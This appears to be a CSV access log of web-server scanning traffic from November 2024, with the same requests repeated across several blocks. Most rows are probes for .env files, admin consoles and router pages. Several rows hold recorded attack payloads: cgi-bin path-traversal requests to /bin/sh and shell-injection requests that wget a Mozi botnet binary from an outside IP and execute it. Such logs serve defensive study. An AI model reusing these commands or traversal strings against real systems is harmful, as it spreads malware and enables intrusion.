ip,date,method,endpoint,status,size
157.181.234.36,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
213.113.62.90,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
234.156.230.44,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
252.236.174.48,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
38.186.85.41,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
116.3.14.86,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
104.51.0.120,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
112.201.91.26,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
33.53.204.250,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
96.29.216.55,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
58.111.44.202,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
68.217.194.222,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
152.118.50.220,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
130.148.161.15,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
177.178.34.74,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
57.100.119.39,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
135.23.59.4,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
8.226.30.214,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
253.172.116.247,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
9.2.145.167,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
140.25.94.141,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
94.244.234.165,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
42.254.1.38,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
136.4.153.192,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
124.157.225.190,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
159.6.21.40,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
243.51.140.143,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
202.12.96.121,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
78.67.18.199,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
64.160.228.142,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
83.223.222.0,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
173.151.174.110,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
107.1.245.61,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
174.113.45.251,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
51.40.217.135,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
24.187.189.47,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
228.40.53.21,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
140.37.142.201,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
111.222.117.22,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
13.21.17.141,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
77.106.183.135,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
211.58.30.130,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
110.253.125.127,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
52.154.20.16,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
95.192.234.147,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
44.41.44.140,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
3.76.110.223,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
156.57.52.194,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
219.227.41.176,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
3.106.120.31,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
94.248.5.77,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
168.23.145.94,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
122.224.152.94,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
190.67.168.157,19/Nov/2024:20:16:26 +0000,,-,408,
5.201.22.39,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
92.18.197.33,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
113.120.198.248,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
167.129.9.150,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
17.78.223.202,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
198.56.165.215,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
120.195.186.191,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
209.228.151.155,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
190.46.187.157,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
129.218.67.70,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
134.116.154.122,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
245.37.132.8,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
167.87.236.177,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
130.51.52.111,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
184.187.70.74,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
202.172.233.162,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
126.61.224.147,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
161.91.74.122,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
23.99.26.219,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
39.98.95.104,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
158.141.236.163,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
248.139.254.118,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
6.52.159.202,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
46.230.96.93,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
242.99.209.238,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
17.138.114.57,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
50.89.81.161,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
83.210.94.64,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
162.174.127.177,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
51.241.133.171,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
241.57.14.30,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
193.26.33.230,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
137.10.5.107,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
144.182.212.55,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
3.66.22.205,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
249.78.82.140,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
28.8.65.24,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
22.69.237.10,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
30.225.127.17,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
12.171.155.175,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
58.139.86.123,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
251.220.74.148,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
35.245.124.245,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
152.196.50.139,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
13.172.142.179,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
16.21.185.4,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
20.235.158.210,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
18.144.212.15,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
122.173.133.97,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
18.228.68.73,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
157.169.54.128,15/Nov/2024:00:35:31 +0000,,-,408,
3.37.193.91,15/Nov/2024:00:36:08 +0000,,-,408,
126.140.227.69,15/Nov/2024:00:36:30 +0000,,-,408,
99.60.211.75,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
106.25.241.168,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
125.44.208.185,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
222.21.61.51,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
101.85.167.60,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
108.58.108.37,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
64.111.226.130,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
205.34.94.192,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
166.104.249.34,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
77.54.139.64,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
201.14.1.177,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
120.20.142.147,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
132.59.100.14,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
182.74.37.87,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
9.251.41.198,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
254.109.142.168,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
126.220.236.76,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
11.6.207.22,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
96.156.56.161,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
162.30.79.63,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
81.220.211.194,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
37.163.103.246,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
45.68.100.209,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
167.232.51.245,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
179.90.236.12,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
201.148.121.238,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
232.109.31.168,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
138.177.155.134,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
5.146.26.209,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
160.171.28.35,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
25.20.224.191,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
42.134.106.242,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
35.211.200.250,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
32.184.173.217,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
10.212.185.58,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
80.209.107.207,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
90.247.232.68,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
21.37.28.39,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
130.45.115.51,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
144.114.199.208,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
158.130.96.89,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
178.240.71.238,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
1.223.58.207,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
108.0.97.13,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
216.56.174.167,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
71.60.71.175,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
252.247.10.111,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
223.21.170.73,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
105.127.211.149,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
158.225.103.153,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
111.146.217.229,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
101.94.227.51,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
76.51.119.132,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
202.225.205.145,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
234.219.151.113,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
109.99.14.8,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
212.216.80.3,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
158.131.98.14,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
71.248.182.142,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
71.215.207.14,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
43.175.131.160,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
194.37.215.127,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
4.149.111.33,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
92.180.231.179,19/Nov/2024:20:16:26 +0000,,-,408,
166.194.208.11,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
216.3.134.119,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
120.100.207.60,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
241.4.0.214,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
32.154.119.22,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
143.170.169.126,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
165.95.229.78,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
160.74.81.254,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
99.35.234.221,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
174.219.127.104,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
246.75.45.31,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
117.88.15.140,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
59.52.121.202,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
228.128.181.97,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
180.247.57.48,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
36.97.70.210,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
214.166.140.159,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
80.22.81.21,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
78.140.2.153,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
25.183.49.100,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
81.125.155.9,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
234.233.82.55,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
194.112.200.30,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
247.210.139.161,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
142.68.227.214,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
216.111.143.37,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
112.237.127.20,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
228.151.208.197,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
214.167.88.246,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
144.216.41.250,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
233.245.151.49,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
228.213.155.28,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
176.243.55.48,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
79.18.145.21,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
173.176.176.163,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
210.164.30.74,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
194.33.135.193,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
30.20.150.203,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
108.138.2.144,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
150.0.9.36,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
233.130.169.79,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
182.13.157.37,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
89.142.215.168,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
115.156.99.14,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
98.77.196.149,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
56.145.242.185,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
55.67.27.48,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
50.106.149.228,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
48.76.77.29,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
223.17.166.198,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
101.157.111.155,15/Nov/2024:00:35:31 +0000,,-,408,
223.118.65.159,15/Nov/2024:00:36:08 +0000,,-,408,
239.75.111.215,15/Nov/2024:00:36:30 +0000,,-,408,
92.250.179.88,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
238.214.241.137,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
253.218.45.92,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
122.240.105.18,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
50.135.176.236,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
70.76.179.84,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
220.242.188.25,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
106.6.15.147,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
206.103.242.103,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
201.207.221.195,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
124.112.86.45,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
212.140.91.56,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
148.10.19.29,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
97.221.132.33,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
10.232.84.22,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
236.16.151.1,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
178.61.85.60,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
209.64.31.180,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
164.167.235.233,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
50.57.88.65,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
238.74.246.200,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
157.27.17.7,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
217.233.77.47,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
220.210.149.33,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
61.192.15.165,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
176.200.163.245,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
201.236.184.206,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
209.166.183.168,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
156.26.135.69,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
207.150.194.242,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
148.200.92.224,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
122.128.142.196,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
98.81.163.72,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
186.55.249.20,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
5.162.1.167,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
189.242.31.177,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
244.72.77.226,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
185.155.202.122,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
168.148.58.251,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
170.215.35.217,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
84.242.55.186,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
113.150.52.129,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
12.212.188.35,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
97.3.190.84,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
7.29.183.108,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
13.250.90.197,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
35.94.67.150,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
59.196.162.73,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
241.53.92.139,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
176.182.237.208,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
